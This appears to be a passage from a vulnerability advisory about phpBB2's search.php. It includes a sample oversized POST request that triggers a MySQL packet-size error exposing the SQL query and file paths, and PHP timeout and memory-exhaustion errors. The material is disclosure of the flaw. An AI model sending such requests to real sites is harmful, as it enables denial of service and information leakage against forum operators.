- --- 1. * SQL query problem ---
phpBB2 don't check size of sql query. So we can send any data in all post 
variables.
Standart Environment:

post_max_size=8M (standart)
max_allowed_packet < 7M (1M standart in mysql)

Example Evironment:
memory_limit>8MB
max_execution_time=30
max_allowed_packet=1M

I have written simple request where one variable POST to sql query was 1M. 

- ---request---
POST /2018/phpBB2/search.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: strlen(x)

mode=results&search_keywords=SecurityReasonComSecurityRea...xMB>max_allowed_packet.
(example.1MB.data)...sonCom
- ---/request---

so in output:

- ---output1---
Could not obtain matched posts list
DEBUG MODE
SQL Error : 1153 Got a packet bigger than 'max_allowed_packet'
SELECT m.post_id FROM phpbb_search_wordlist w, phpbb_search_wordmatch m WHERE 
w.word_text LIKE 'securityreasoncomsecurityreasoncom...' AND m.word_id = 
w.word_id AND w.word_common <> 1 AND m.title_match = 0
Line : 321
File : search.php
- ---/output1---

sql error.

or when you have:
memory_limit=8MB
or
max_execution_time<30
display_error=1

You can see in output example:

- ---output2---
Fatal error: Maximum execution time of 15 seconds exceeded 
in /www/2018/phpBB2/includes/functions_search.php on line 72
- ---/output2---

- ---output3---
Fatal error: Allowed memory size of 8388608 bytes exhausted (tried to allocate 
1746401 bytes) in /www/2018/phpBB2/includes/functions_search.php on line 27
- ---/output3---
